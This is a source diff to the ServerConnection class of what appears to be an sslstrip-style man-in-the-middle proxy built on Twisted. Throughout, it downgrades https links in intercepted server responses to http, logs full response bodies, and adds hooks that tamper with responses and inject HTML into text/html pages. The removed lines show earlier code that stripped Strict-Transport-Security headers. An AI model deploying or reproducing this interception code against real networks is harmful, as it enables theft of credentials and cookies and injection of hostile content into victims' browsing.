@@ -20,6 +20,8 @@ import logging, re, string, random, zlib, gzip, StringIO
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
+from ResponseTampererFactory import ResponseTampererFactory
+from Proxy import *
 
 class ServerConnection(HTTPClient):
 
@@ -30,12 +32,7 @@ class ServerConnection(HTTPClient):
 
     urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
     urlType           = re.compile(r"https://", re.IGNORECASE)
-    urlTypewww           = re.compile(r"https://www", re.IGNORECASE)
-    urlwExplicitPort   = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
     urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
-    urlToken1 		  = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
-    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
-#    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
         self.command          = command
@@ -44,10 +41,17 @@ class ServerConnection(HTTPClient):
         self.headers          = headers
         self.client           = client
         self.urlMonitor       = URLMonitor.getInstance()
+        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
         self.shutdownComplete = False
+        self.plugins          = {}
+        plugin_classes = Plugin.PluginProxy.__subclasses__()
+        for p in plugin_classes: self.plugins[p._name] = p()
+        for pluginscheck in self.plugins.keys():
+            if self.plugins[pluginscheck].getInstance()._activated:
+                self.HTMLInjector = self.plugins[pluginscheck].getInstance()
 
     def getLogLevel(self):
         return logging.DEBUG
@@ -87,6 +91,7 @@ class ServerConnection(HTTPClient):
 
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
+            self.urlMonitor.addRedirection(self.client.uri, value)
 
         if (key.lower() == 'content-type'):
             if (value.find('image') != -1):
@@ -101,11 +106,8 @@ class ServerConnection(HTTPClient):
             self.contentLength = value
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
-        elif (key.lower()== 'strict-transport-security'):
-        	logging.log(self.getLogLevel(), "LEO Erasing Strict Transport Security....")
         else:
             self.client.setHeader(key, value)
-            
 
     def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
@@ -132,48 +134,44 @@ class ServerConnection(HTTPClient):
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
             
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
-        #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )
-
 
         data = self.replaceSecureLinks(data)
 
+        # ------ TAMPER ------
+        if self.responseTamperer:
+            data = self.responseTamperer.tamper(self.client.uri, data, self.client.responseHeaders, self.client.getAllHeaders(), self.client.getClientIP())
+        # ------ TAMPER ------
+        if hasattr(self,'HTMLInjector'):
+            # ------ HTML CODE INJECT ------
+            if self.HTMLInjector._instance != None:
+                content_type = self.client.responseHeaders.getRawHeaders('content-type')
+
+                # only want to inject into text/html pages
+                if content_type and content_type[0] == 'text/html':
+                    #data = self.HTMLInjector.inject(data)
+                    data = self.HTMLInjector.inject(data, self.client.uri)
+            # ------ HTML CODE INJECT ------
+
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
     def replaceSecureLinks(self, data):
-        sustitucion = {}
-        patchDict = self.urlMonitor.patchDict
-        if len(patchDict)>0:
-        	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
-        	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
-		
-		iterator = re.finditer(ServerConnection.urlExpression, data)       
+        iterator = re.finditer(ServerConnection.urlExpression, data)
+
         for match in iterator:
             url = match.group()
-			
-            logging.debug("Found secure reference: " + url)
-            nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-            logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
-            sustitucion[url] = nuevaurl
-            #data.replace(url,nuevaurl)
-        
-        #data = self.urlMonitor.DataReemplazo(data)
-        if len(sustitucion)>0:
-        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
-        	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
-        
-        #logging.debug("LEO DEBUG received data:\n"+data)	
-        #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
-        #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
-        #if data.find("http://w.face")!=-1:
-        #	logging.debug("LEO DEBUG Found error in modifications")
-        #	raw_input("Press Enter to continue")
-        #return re.sub(ServerConnection.urlType, 'http://web.', data)
-        return data
 
+            logging.debug("Found secure reference: " + url)
+
+            url = url.replace('https://', 'http://', 1)
+            url = url.replace('&amp;', '&')
+            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+
+        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+        return re.sub(ServerConnection.urlType, 'http://', data)
 
     def shutdown(self):
         if not self.shutdownComplete:
